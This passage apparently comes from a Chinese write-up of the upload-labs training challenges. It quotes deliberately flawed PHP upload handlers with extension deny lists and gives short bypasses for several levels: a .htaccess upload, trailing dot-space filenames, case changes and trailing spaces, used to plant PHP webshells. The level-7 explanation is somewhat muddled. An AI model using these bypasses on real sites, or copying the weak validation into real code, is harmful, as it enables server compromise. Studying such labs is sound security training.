class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-3"><a href="#解答：-3" class="headerlink" title="解答："></a>解答：</h3><p><del>全过滤了还怎么打</del></p>
<p>唯独放了一个<code>.htaccess</code>，只能构筑相应文件：</p>
<p>前提条件：（<code>1.mod_rewrite模块开启。2.AllowOverride All</code>）</p>
<p>此时，传上去的图片都会被解析成PHP文件。直接传马连a.png即可。</p>
<h2 id="level-5和10-空格-空格"><a href="#level-5和10-空格-空格" class="headerlink" title="level-5和10(.空格.空格)"></a>level-5和10(.空格.空格)</h2><h3 id="源码5"><a href="#源码5" class="headerlink" title="源码5:"></a>源码5:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="源码10"><a href="#源码10" class="headerlink" title="源码10:"></a>源码10:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-4"><a href="#解答：-4" class="headerlink" title="解答："></a>解答：</h3><p>全ban完了，用.{空格}.绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">filename &#x3D; &quot;phpinfo.php. . &quot;</span><br></pre></td></tr></table></figure>
<p>访问 phpinfo.php 即可</p>
<h2 id="level-6-大小写绕过"><a href="#level-6-大小写绕过" class="headerlink" title="level-6(大小写绕过)"></a>level-6(大小写绕过)</h2><h3 id="源码：-4"><a href="#源码：-4" class="headerlink" title="源码："></a>源码：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-5"><a href="#解答：-5" class="headerlink" title="解答："></a>解答：</h3><p>没有防大小写，直接后缀名改成PHP一把梭了。、</p>
<h2 id="level-7-空格绕过"><a href="#level-7-空格绕过" class="headerlink" title="level-7(空格绕过)"></a>level-7(空格绕过)</h2><h3 id="源码：-5"><a href="#源码：-5" class="headerlink" title="源码："></a>源码：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-6"><a href="#解答：-6" class="headerlink" title="解答："></a>解答：</h3><p>空格绕过，上传 <code>phpinfo.php</code> ，访问<code>phpinfo.php.</code></p>
<p>00截断的php版本要求是小于5.3.29</p>
<h2 id="level-8-点绕过"><a href="#level-8-点绕过" class="headerlink" title="level-8(点绕过)"></a>level-8(点绕过)</h2><h3 id="源码：-6"><a href="#源码：-6" class="headerlink" title="源码："></a>源码：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span 